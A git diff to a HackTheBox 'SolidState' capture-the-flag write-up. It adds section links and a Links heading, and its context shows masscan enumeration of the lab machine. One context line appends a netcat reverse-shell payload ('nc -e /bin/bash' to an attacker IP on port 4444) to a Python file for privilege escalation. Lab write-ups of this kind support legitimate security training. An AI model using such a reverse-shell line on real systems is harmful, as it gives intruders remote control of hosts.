@@ -11,6 +11,13 @@
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cfbabc4e-f48e-4b54-a564-3d029e437614)
 
 
+# Sections
++ [Enumeration](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/10_SolidState.md#enumeration)
++ [Gaining Access](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/10_SolidState.md#gaining-access)
++ [Privilege Escalation](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/10_SolidState.md#privilege-escalation)
++ [Links](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/10_SolidState.md#links)
+
+
 ## Enumeration
 + `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.51 -e tun0 > ports`
 + `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
@@ -229,6 +236,9 @@ echo "os.system('/bin/nc -e /bin/bash 10.10.14.10 4444')" >> tmp.py
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bf72433f-2a2e-4170-a00d-6828eb6c7ba3)
 
+---
+
+# Links
 
 # References & Alternatives
 + https://vvmlist.github.io/#solidstate
